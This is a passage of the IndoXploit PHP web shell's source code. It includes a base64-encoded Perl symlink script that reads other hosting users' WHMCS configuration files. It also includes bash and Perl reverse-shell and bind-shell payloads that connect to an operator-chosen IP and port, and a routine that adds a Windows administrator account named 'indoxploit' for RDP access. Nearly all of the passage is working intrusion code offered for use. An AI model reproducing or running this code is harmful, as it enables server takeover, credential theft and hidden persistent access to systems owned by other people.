UNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0FSVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvT1JERVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UQVJFQS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQlVZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTUFOQUdFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9DQopOw0KZm9yZWFjaCAoQGFycmF5KXsNCglteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9Ow0KCW15ICR0eXBlY29uZmlnID0gJF8tPnt0eXBlfTsNCglzeW1saW5rKCIkY29uZmlnbnlhIiwiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsNCglta2RpciAiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJpZHhfc3ltLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dC8weDE5OTkudHh0Iik7DQoJY29weSgiaWR4X3N5bS9uZW11LnR4dCIsImlkeF9zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1pZHhfc3ltIi8+JzsNCnByaW50ICc8Ym9keT48Y2VudGVyPjxoMT4weDE5OTkgTmV2ZXIgRGllPC9oMT4nOw0KcHJpbnQgJzxhIGhyZWY9ImlkeF9zeW0iPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw==";
			save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
			exe("perl /tmp/symlink.pl");
			sleep(1);
			@unlink("/tmp/symlink.pl");
			@unlink("passwd.txt");
			@unlink("idx_sym/pas.txt");
			@unlink("idx_sym/nemu.txt");
		}

		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym/' frameborder='0' scrolling='yes'></iframe>";
		print "</div>";
	}
	elseif($toolsname === "network") {
		$args = explode(" ", $args);

		if($args[0] === "bc") {
			if(empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
			if(empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
			if(empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));

			if($args[3] === "bash") {
				exe("/bin/bash -i >& /dev/tcp/".$args[1]."/".$args[2]." 0>&1");
			}
			elseif($args[3] === "perl") {
				$bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
				save("/tmp/bc.pl", "w", base64_decode($bc['code']));
				$bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
				@unlink("/tmp/bc.pl");
			}
		}
		elseif($args[0] === "bp") {
			if(empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
			if(empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));

			if($args[2] === "perl") {
				$bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
				save("/tmp/bp.pl", "w", base64_decode($bp['code']));
				$bp['exec'] = exe("perl /tmp/bp.pl ".$args[1]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bp['exec']."\n".exe("ps aux | grep bp.pl")."</pre>";
				@unlink("/tmp/bp.pl");
			}
		}
		else {
			print color(1, 1, "Unknown '".$args[0]."'");
		}
	}
	elseif($toolsname === "krdp") {
		$args = explode(" ", $args);

		if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
		if(preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));

		$add_user   = exe("net user indoxploit indoxploit /add");
    	$add_groups1 = exe("net localgroup Administrators indoxploit /add");
    	$add_groups2 = exe("net localgroup Administrator indoxploit /add");
    	$add_groups3 = exe("net localgroup Administrateur indoxploit /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "indoxploit")."<br>
    	Password: ".color(1, 2, "indoxploit")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";

    	if($add_user) {
    		print "[add user] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	else {
    		print "[add user] -> ".color(1, 1, "FAILED")."<br>";
    	}
    	
    	if($add_groups1) {
        	print "[add localgroup Administrators] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	elseif($add_groups2) {
            print "[add localgroup Administrator] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	elseif($add_groups3) { 
            print "[add localgroup Administrateur] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	else {
    		print "[add localgroup] -> ".color(1, 1, "FAILED")."<br>";
    	}

    	print "------------------------------<br>";
	}
}

function files_and_folder() {
	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
	print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		   <tr>
		   <th class="th_home"><center>Name</center></th>
		   <th class="th_home"><center>Type</center></th>
		   <th class="th_home"><center>Size</center></th>
		   <th class="th_home"><center>Last Modified</center></th>
		   <th class="th_home"><center>Owner/Group</center></th>
		   <th class="th_home"><center>Permission</center></th>
		   <th class="th_home"><center>Action</center></th>
		   </tr>';

	if(function_exists('opendir')) {
		if($opendir = opendir(path())) {
			while(($readdir = readdir($opendir)) !== false) {
				$dir[] = $readdir;
			}
			closedir($opendir);
